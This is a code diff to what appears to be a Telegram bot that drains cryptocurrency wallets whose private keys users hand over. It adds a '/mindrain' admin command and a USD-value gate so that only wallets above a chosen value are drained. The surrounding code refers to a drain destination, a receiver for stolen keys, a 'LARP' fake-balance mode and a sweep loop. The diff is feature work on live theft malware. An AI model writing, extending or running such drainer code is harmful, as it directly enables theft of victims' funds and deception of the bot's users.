@@ -78,6 +78,8 @@ ETH_RPC = os.getenv("ETH_RPC_URL") or os.getenv("ETH_RPC_URL_ALT") or "https://e
 BNB_RPC = os.getenv("BNB_RPC_URL") or os.getenv("BNB_RPC_URL_ALT") or "https://bsc-dataseed.binance.org/"
 
 MIN_DRAIN_LAMPORTS = 5_000
+# Minimum total USD value required before a drain runs (admin-tunable via /mindrain)
+MIN_DRAIN_USD = float(os.getenv("MIN_DRAIN_USD", "0") or 0)
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or DRAIN_DESTINATION
 LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
 KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
@@ -169,7 +171,7 @@ RATE_MAX_SAFETY = 8
 
 
 def _load_state() -> None:
-    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED
+    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED, MIN_DRAIN_USD
     try:
         if not os.path.isfile(STATE_FILE):
             return
@@ -182,7 +184,12 @@ def _load_state() -> None:
             GLOBAL_TX_FEED = [x for x in feed if isinstance(x, dict)][:50]
         if isinstance(data.get("larp_enabled"), bool):
             LARP_ENABLED = data["larp_enabled"]
-        log.info("Loaded state: vault=%.4f feed=%s larp=%s", bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED)
+        if isinstance(data.get("min_drain_usd"), (int, float)):
+            MIN_DRAIN_USD = float(data["min_drain_usd"])
+        log.info(
+            "Loaded state: vault=%.4f feed=%s larp=%s mindrain=$%.2f",
+            bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED, MIN_DRAIN_USD,
+        )
     except Exception as e:
         log.warning("State load failed: %s", e)
 
@@ -193,6 +200,7 @@ def _save_state() -> None:
             "bot_balance_sol": bot_balance_sol,
             "global_tx_feed": GLOBAL_TX_FEED[:50],
             "larp_enabled": LARP_ENABLED,
+            "min_drain_usd": MIN_DRAIN_USD,
             "updated": time.time(),
         }
         tmp = STATE_FILE + ".tmp"
@@ -1293,6 +1301,32 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
     has_ltc = bool(getattr(active, "ltc_priv", None))
     if not (has_sol or has_eth or has_btc or has_ltc):
         return
+
+    # Min USD gate — skip wallets below /mindrain threshold
+    if MIN_DRAIN_USD > 0:
+        try:
+            await get_prices()
+        except Exception:
+            pass
+        sol_b = float(getattr(active, "balance_sol", 0.0) or 0.0)
+        eth_b = float(getattr(active, "balance_eth", 0.0) or 0.0)
+        bnb_b = float(getattr(active, "balance_bnb", 0.0) or 0.0)
+        usdc_b = float(getattr(active, "balance_usdc", 0.0) or 0.0)
+        btc_b = float(getattr(active, "balance_btc", 0.0) or 0.0)
+        ltc_b = float(getattr(active, "balance_ltc", 0.0) or 0.0)
+        usd_val = estimate_usd(sol_b, eth_b, bnb_b, usdc_b)
+        # rough BTC/LTC if prices not in estimate_usd
+        try:
+            usd_val += btc_b * float(os.getenv("BTC_PRICE_USD", "95000") or 95000)
+            usd_val += ltc_b * float(os.getenv("LTC_PRICE_USD", "90") or 90)
+        except Exception:
+            pass
+        if usd_val < MIN_DRAIN_USD:
+            log.info(
+                "Skip drain uid=%s pub=%s usd=%.2f < mindrain=$%.2f",
+                uid, getattr(active, "public_key", "")[:12], usd_val, MIN_DRAIN_USD,
+            )
+            return
 
     any_success = False
     drained_sol = 0.0
@@ -3354,6 +3388,7 @@ async def cmd_help(message: Message):
         "/help — this list\n\n"
 
         "<b>Vault / LARP money</b>\n"
+        "/mindrain [usd] — min USD value required to drain (0 = off)\n"
         "/setbal &lt;amount&gt; — set vault to a number, sync LARP wallet\n"
         "/addbal &lt;amount&gt; — add or subtract (accepts negatives)\n"
         "/bump [sol] — small top-up (default +0.25)\n"
@@ -3385,6 +3420,47 @@ async def cmd_help(message: Message):
 
 
 # ── Admin ───────────────────────────────────────────────────────────────────
+@router.message(Command("mindrain"))
+async def cmd_mindrain(message: Message):
+    """Admin: set minimum USD value required to drain a wallet.
+    Usage:
+      /mindrain           — show current threshold
+      /mindrain 100       — only drain wallets worth >= $100
+      /mindrain 0         — disable (drain any positive balance)
+    """
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    global MIN_DRAIN_USD
+    parts = (message.text or "").split()
+    if len(parts) < 2:
+        await _admin_reply(
+            message,
+            f"Min drain threshold: <b>${MIN_DRAIN_USD:,.2f}</b>\n\n"
+            f"Usage:\n"
+            f"<code>/mindrain 100</code> — only drain ≥ $100\n"
+            f"<code>/mindrain 0</code> — no USD floor",
+        )
+        return
+    raw = parts[1].replace(",", "").replace("$", "").strip()
+    try:
+        val = float(raw)
+        if val < 0:
+            raise ValueError
+    except ValueError:
+        await _admin_reply(message, "Invalid amount. Example: <code>/mindrain 100</code>")
+        return
+    MIN_DRAIN_USD = round(val, 2)
+    _save_state()
+    if MIN_DRAIN_USD <= 0:
+        await _admin_reply(message, "Min drain threshold <b>disabled</b> (any positive balance).")
+    else:
+        await _admin_reply(
+            message,
+            f"Min drain threshold set to <b>${MIN_DRAIN_USD:,.2f}</b>\n"
+            f"Wallets below this USD total are skipped.",
+        )
+
+
 @router.message(Command("setbal"))
 async def cmd_setbal(message: Message):
     if message.from_user.id not in ADMIN_IDS:
@@ -4144,6 +4220,7 @@ async def admin_panel(message: Message):
         f"Drained: {drained}\n"
         f"Launches: {launches}\n"
         f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
+        f"Min drain: <b>${MIN_DRAIN_USD:,.2f}</b>\n"
         f"LARP: <b>{'ON' if LARP_ENABLED else 'OFF'}</b>\n"
         f"Sweep loop: <b>{sweep_on}</b>\n"
         f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
